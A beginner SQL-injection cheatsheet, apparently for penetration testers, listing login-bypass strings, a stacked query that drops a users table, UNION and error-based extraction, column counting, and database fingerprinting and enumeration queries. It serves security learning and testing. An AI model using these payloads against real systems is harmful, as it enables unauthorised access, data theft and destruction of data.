# SQL for Pentesters - Beginner Cheatsheet

---

## What is SQL?

SQL (Structured Query Language) is used to interact with databases.

---

## Basic SQL Syntax

```sql
SELECT * FROM users;
SELECT username, password FROM accounts;
```

- `SELECT` → Retrieve data
- `FROM` → Specify the table
- `WHERE` → Add conditions

---

## SQL Injection Basics

### Classic Injection
```sql
' OR '1'='1
```

### Bypass Login
```sql
admin' --
' OR 1=1 --
```

### Tautology Injection
```sql
' OR 'a'='a
```

### Stacked Queries (if supported)
```sql
1; DROP TABLE users--
```

---

## Useful Operators

- `' OR 1=1 --` → Always true
- `' UNION SELECT` → Combine results from two queries
- `--` or `#` → Comment out rest of the query
- `AND`, `OR`, `NOT` → Logical operators

---

## Extracting Information

### Determine number of columns
```sql
' ORDER BY 1--
' ORDER BY 2--
```

### UNION SELECT (basic)
```sql
' UNION SELECT null, null--
```

### Error-based injection
```sql
' AND 1=CONVERT(int, (SELECT @@version))--
```

---

## Database Fingerprinting

### MySQL
```sql
SELECT @@version;
SELECT database();
```

### PostgreSQL
```sql
SELECT version();
SELECT current_database();
```

### MSSQL
```sql
SELECT @@version;
SELECT db_name();
```

---

## Enumerating Tables and Columns (MySQL example)

### List Tables
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema = 'target_db';
```

### List Columns
```sql
SELECT column_name FROM information_schema.columns WHERE table_name = 'users';
```

---

## Tools

- `sqlmap` → Automated SQL injection tool
- `Burp Suite` → Intercept and modify SQLi payloads
- Browser extensions → Tamper Data, HackBar, etc.

---

## Tips

- Test with `'` or `"` to look for SQL errors
- Look at response differences when injecting
- Use `LIMIT` to restrict large outputs

---
